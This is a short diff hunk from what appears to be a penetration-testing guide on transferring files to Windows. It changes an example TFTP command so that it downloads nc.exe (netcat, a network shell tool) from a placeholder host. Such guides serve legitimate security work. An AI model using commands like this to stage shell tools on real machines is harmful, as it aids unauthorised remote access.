@@ -39,7 +39,7 @@ With this command you can serve files from `/srv/tftp`.
 From a Windows machine, use this to transfer files:
 
 ```text
-tftp -i [host] GET wget.exe
+tftp -i [host] get nc.exe
 ```
 
 ### VBScript
